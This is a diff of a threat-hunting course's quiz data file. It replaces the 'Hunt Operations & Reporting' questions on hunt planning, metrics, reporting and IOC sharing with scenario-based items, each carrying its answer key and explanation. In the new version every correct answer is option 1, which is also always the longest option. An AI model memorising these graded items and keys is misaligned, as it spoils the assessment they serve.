+                  "Cert-based hunting: rank destinations by (self-signed OR default CN 'localhost'/'kubernetes'/'example') AND short validity AND rare issuer AND non-web JA3S — a strong C2/redteam-tool signal, especially when combined with beaconing behavior",
+                  "Only flag expired certs",
+                  "Ignore certs — TLS is opaque"
+              ],
+              correctAnswer: 1,
+              explanation: "Cert metadata is visible even under TLS 1.3 (SNI + cert seen in handshake). Combining cert anomalies with JA3/JA3S and beaconing cadence is one of the highest-fidelity network C2 hunts."
+          }
+      ]
   },
   {
-    quizId: "th-q6",
-    courseId: "threat-hunting",
-    title: "Hunt Operations & Reporting",
-    description: "Test your knowledge of hunt planning, automation, metrics, and reporting best practices.",
-    passingScore: 70,
-    timeLimit: 15,
-    questions: [
-      { id: "th-q6-1", question: "What should a hunt plan document include?", options: ["Only the initial starting hypothesis statement and the name of the assigned analyst", "A comprehensive checklist of all organizational assets and physical server locations", "Hypothesis, data sources, analysis techniques, tools, expected artifacts, and success criteria", "A detailed list of known indicator of compromise signatures gathered from external blogs"], correctAnswer: 2, explanation: "A complete hunt plan includes hypothesis, required data sources, analysis techniques, tools, expected artifacts, and success criteria." },
-      { id: "th-q6-2", question: "What is the main benefit of converting hunt findings into automated detections?", options: ["Scales the hunt outcome so the same threat is automatically detected going forward in the future", "Reduces overall security team headcount and lowers operational licensing costs for SIEM tools", "Completely eliminates the need for any manual hunting or active hypothesis development by analysts", "Saves cloud database storage capacity by compressing long-term historical endpoint event logs"], correctAnswer: 0, explanation: "Converting hunts into detections means the threat is automatically caught going forward, multiplying the value of each hunt." },
-      { id: "th-q6-3", question: "Which tool/platform is commonly used for hunt automation and notebooks?", options: ["Microsoft Paint — commonly used for manual creation of process trees and network topology diagrams", "Standard Windows Calculator — used for performing quick event frequency and log size calculations", "Default Notepad editor — used for copy-pasting raw logs and organizing unstructured text snippets", "Jupyter Notebooks with MSTICPy — provides reproducible, shareable data analysis hunt workflows"], correctAnswer: 3, explanation: "Jupyter Notebooks with MSTICPy provide reproducible, shareable hunt workflows with built-in security analysis capabilities." },
-      { id: "th-q6-4", question: "What is the 'detection gap' metric?", options: ["The average processing time delay between the occurrence of a security event and its alert generation", "The difference between existing real-world threats and what the organization can actively detect", "The network transmission latency between remote branch offices and central cloud security log pools", "The gap in analyst shift schedules during weekend handovers that leaves the console unmonitored"], correctAnswer: 1, explanation: "Detection gap measures the difference between threats that exist and those the org can detect — hunting directly reduces this gap." },
-      { id: "th-q6-5", question: "What should a hunt report's executive summary contain?", options: ["A collection of raw, unparsed log outputs and complex search queries used during the hunt process", "Only specific threat indicator files like IP address lists and malware file hash values to block", "High-level findings, business impact, threat risk assessment, and specific recommended actions", "Detailed technical configuration details of the endpoint agent software used to collect system data"], correctAnswer: 2, explanation: "Executive summaries provide leadership with findings, business impact, risk context, and clear recommended actions." },
-      { id: "th-q6-6", question: "How should hunt metrics demonstrate program value?", options: ["Track hunts completed, unique findings discovered, detections created, and coverage improvements", "Count only the total hours worked and resources consumed by security analysts during the quarter", "Report only unsuccessful hunts where no active threat actors or configuration errors were found", "Count the total number of outbound status update emails sent to executive stakeholders each week"], correctAnswer: 0, explanation: "Effective metrics include hunts completed, unique findings, new detections created, MITRE coverage improvements, and mean time to detect." },
-      { id: "th-q6-7", question: "What is the purpose of a 'hunt backlog'?", options: ["Storing historic, cold-tier log files that are no longer needed for active incident investigations", "Tracking employee scheduled time-off requests to ensure adequate analyst coverage at all times", "Archiving completed PDF hunt reports to meet compliance audit and document retention standards", "Maintaining a prioritized queue of hypotheses and hunt ideas for future scheduled execution cycles"], correctAnswer: 3, explanation: "A hunt backlog is a prioritized list of hypotheses and ideas, ensuring continuous hunting coverage aligned with threat landscape." },
-      { id: "th-q6-8", question: "When should IOCs discovered during a hunt be shared?", options: ["Keep them strictly confidential within the hunt team to prevent disclosing internal detection gaps", "Share immediately with internal SOC and incident response teams, plus relevant intel communities", "Delay sharing for at least six months to allow time for the security vendor to analyze patterns", "Share exclusively with local system administrators without notifying the central security operations"], correctAnswer: 1, explanation: "IOCs should be shared immediately with SOC/IR for blocking and with threat intel sharing communities (ISACs) for collective defense." },
-      { id: "th-q6-9", question: "What does 'MITRE ATT&CK coverage mapping' help hunters understand?", options: ["Mapping the physical corporate network topology to locate all connected routers and user devices", "Evaluating individual analyst technical skill levels against industry standard security certifications", "Visualizing which adversary techniques can be detected, highlighting gaps to prioritize future hunts", "Calculating annual budget allocations for threat detection software licenses and hardware appliances"], correctAnswer: 2, explanation: "ATT&CK coverage mapping visualizes detection capabilities against known techniques, highlighting gaps to prioritize hunts." },
-      { id: "th-q6-10", question: "What is the relationship between threat hunting and detection engineering?", options: ["Hunt findings feed detection engineering; detection gaps inform hunt priorities in a continuous cycle", "They are completely unrelated operational functions with separate goals and no shared communication", "Threat hunting completely replaces detection engineering, rendering automated alerts obsolete and unused", "Detection engineering completely replaces threat hunting, automating all hypothesis testing processes"], correctAnswer: 0, explanation: "Hunting and detection engineering form a virtuous cycle: hunts discover threats → detections are built → gaps inform new hunts." }
-    ]
+      quizId: "th-q6",
+      courseId: "threat-hunting",
+      title: "Hunt Operations & Reporting",
+      description: "Program-level operations: hunt planning, automation, metrics, executive reporting, and the hunt→detect handoff.",
+      passingScore: 70,
+      timeLimit: 20,
+      questions: [
+          {
+              id: "th-q6-1",
+              difficulty: "easy",
+              tags: ["Hunt Plan"],
+              scenario: "A junior hunter submits a one-line plan: 'I'll look for lateral movement this sprint.'",
+              question: "What are the mandatory elements they must add before work begins?",
+              options: [
+                  "Just a due date",
+                  "Hypothesis, ATT&CK mapping, data sources & retention, analytical technique, tools/queries, expected artifacts, success/failure criteria, and hand-off owner",
+                  "Only the queries",
+                  "A screenshot of the SIEM"
+              ],
+              correctAnswer: 1,
+              explanation: "Without these, the hunt is unrepeatable, unmeasurable, and hard to hand off. Every mature program uses a hunt-plan template."
+          },
+          {
+              id: "th-q6-2",
+              difficulty: "easy",
+              tags: ["Hunt → Detection"],
+              scenario: "Your last four hunts each surfaced novel behavior but no detections were built afterward. This quarter's dwell time went up.",
+              question: "What is the core process failure?",
+              options: [
+                  "Analysts are too slow",
+                  "Missing hunt→detection handoff: every confirmed technique should produce a Sigma/analytic candidate with FP analysis, tuning, and ownership by detection engineering — otherwise the same gap re-opens next month",
+                  "Not enough hunts",
+                  "Wrong SIEM"
+              ],
+              correctAnswer: 1,
+              explanation: "The measurable output of hunting is durable detections and coverage improvements. Without the handoff, hunting is entertainment."
+          },
+          {
+              id: "th-q6-3",
+              difficulty: "medium",
+              tags: ["Tooling"],
+              scenario: "Your team keeps rewriting the same enrichment code (VT lookups, WHOIS, GeoIP, ATT&CK mapping) in ad-hoc scripts every hunt.",
+              question: "Which platform choice standardizes this and makes hunts reproducible?",
+              options: [
+                  "Excel",
+                  "Jupyter notebooks with MSTICPy (or equivalent) — versioned, reproducible, shareable, with reusable enrichment/query/visualization primitives; results become the hunt artifact",
+                  "Word documents",
+                  "Screenshots in a wiki"
+              ],
+              correctAnswer: 1,
+              explanation: "Notebook-based hunting turns work into reusable, auditable artifacts. MSTICPy provides pre-built connectors, enrichers, and ATT&CK helpers so hunters stop reinventing the wheel."
+          },
+          {
+              id: "th-q6-4",
+              difficulty: "medium",
+              tags: ["Detection Gap"],
+              scenario: "Leadership asks for one number that captures how well the program is closing blind spots.",
+              question: "Which metric best proxies 'detection gap' over time?",
+              options: [
+                  "Number of alerts per day",
+                  "ATT&CK (sub-)technique coverage — count of (sub-)techniques with at least one validated, in-production detection (ideally validated by purple-team tests), tracked as a trend line and by tactic",
+                  "Number of hunts done",
+                  "SIEM license utilization"
+              ],
+              correctAnswer: 1,
+              explanation: "Validated ATT&CK coverage is the most honest single metric of 'what we can detect vs what adversaries do'. Alert counts measure noise, not capability."
+          },
+          {
+              id: "th-q6-5",
+              difficulty: "medium",
+              tags: ["Executive Reporting"],
+              scenario: "You must brief the CFO on last quarter's hunting.",
+              question: "What belongs in the executive summary?",
+              options: [
+                  "Raw SPL queries and Sysmon EIDs",
+                  "Business-impact findings, risk reduced (with dollar or downtime proxies), new detections added, coverage delta on ATT&CK, top three residual risks, and asks for the next quarter",
+                  "Screenshots of dashboards",
+                  "A list of every alert"
+              ],
+              correctAnswer: 1,
+              explanation: "Executives need decisions, not queries. Translate technical findings into risk, coverage, and investment asks."
+          },
+          {
+              id: "th-q6-6",
+              difficulty: "medium",
+              tags: ["Program Metrics"],
+              scenario: "Your KPI dashboard tracks only 'hours worked' and 'hunts opened'.",
+              question: "Which balanced metric set actually reflects program value?",
+              options: [
+                  "Just add ticket counts",
+                  "Hunts completed, unique findings, detections shipped, ATT&CK coverage delta, MTTD/MTTR improvement, and false-positive rate of shipped detections — outcome + quality, not just activity",
+                  "Only track findings",
+                  "Only track hours"
+              ],
+              correctAnswer: 1,
+              explanation: "Activity metrics (hours, count) are gameable. Outcome + quality metrics (coverage, MTTD, FP rate of new detections) resist gaming and drive real improvement."
+          },
+          {
+              id: "th-q6-7",
+              difficulty: "medium",
+              tags: ["Backlog"],
+              scenario: "New CTI drops weekly, incidents produce follow-ups, and a data scientist keeps pitching analytics ideas. Everyone is stepping on each other.",
+              question: "How should the hunt backlog be managed?",
+              options: [
+                  "First-come-first-served",
+                  "A single ranked backlog scored on threat-to-org relevance × likelihood × detection-gap × feasibility, groomed weekly; every entry has a template hypothesis and an owner, and completed hunts feed back into scoring",
+                  "Do whatever the loudest person says",
+                  "No backlog needed"
+              ],
+              correctAnswer: 1,
+              explanation: "A scored, groomed backlog stops the program from being reactive and ensures the highest-value hunts run first. Feedback loops keep scoring honest."
+          },
+          {
+              id: "th-q6-8",
+              difficulty: "hard",
+              tags: ["IOC Sharing"],
+              scenario: "During a confirmed intrusion you extract 12 IOCs and 3 novel TTPs. Legal has authorized TLP:AMBER sharing with your sector ISAC.",
+              question: "What is the right sharing timing and format?",
+              options: [
+                  "Sit on it for 90 days",
+                  "Immediately: internal SOC/IR/detection engineering for blocking and hunting; ISAC/MISP for peers, packaged with ATT&CK mapping, YARA/Sigma, TLP marking, and confidence — with victim-identifying detail redacted",
+                  "Only after full RCA",
+                  "Never share"
+              ],
+              correctAnswer: 1,
+              explanation: "Speed matters — adversaries reuse infrastructure and TTPs across victims for hours to weeks. Structured sharing with proper TLP protects the source while enabling collective defense."
+          },
+          {
+              id: "th-q6-9",
+              difficulty: "hard",
+              tags: ["ATT&CK Coverage"],
+              scenario: "Your ATT&CK Navigator layer shows 61% technique coverage. A peer org claims 92%.",
+              question: "What is the correct skeptical read?",
+              options: [
+                  "You're losing — buy more tools",
+                  "Coverage percentages are meaningless without: (a) which sub-techniques and platforms are counted, (b) whether detections are validated (purple team / atomic tests), (c) FP-tuned and in production, (d) matched to your threat model — compare methodology first, numbers second",
+                  "92% is impossible",
+                  "Coverage doesn't matter"
+              ],
+              correctAnswer: 1,
+              explanation: "ATT&CK coverage is trivially inflated by counting untested rules. Meaningful coverage is validated, tuned, and threat-model-relevant. Compare methodology before numbers."
+          },
+          {
+              id: "th-q6-10",
+              difficulty: "hard",
+              tags: ["Hunting ↔ Detection Engineering"],
+              scenario: "Leadership asks whether hunting and detection engineering should be merged into one team to 'save cost'.",
+              question: "What is the strongest argument for keeping them distinct but tightly coupled?",
+              options: [
+                  "They do the same thing — merge",
+                  "They are complementary halves of a loop: hunting explores unknowns and produces novel signal; detection engineering hardens known signal into production analytics with SLAs, tuning, and lifecycle — merging risks either killing exploration under alert-backlog pressure or shipping untuned analytics; separate charters + shared backlog + KPIs on the handoff preserves both",
+                  "Only hunting matters",
+                  "Only detection engineering matters"
+              ],
+              correctAnswer: 1,
+              explanation: "The two functions have different tempos, KPIs, and risk profiles. Coupling via shared backlog and explicit handoff SLAs beats structural merging."
+          }
+      ]
   },
   // ===================== Detection Engineering Basics =====================
   {
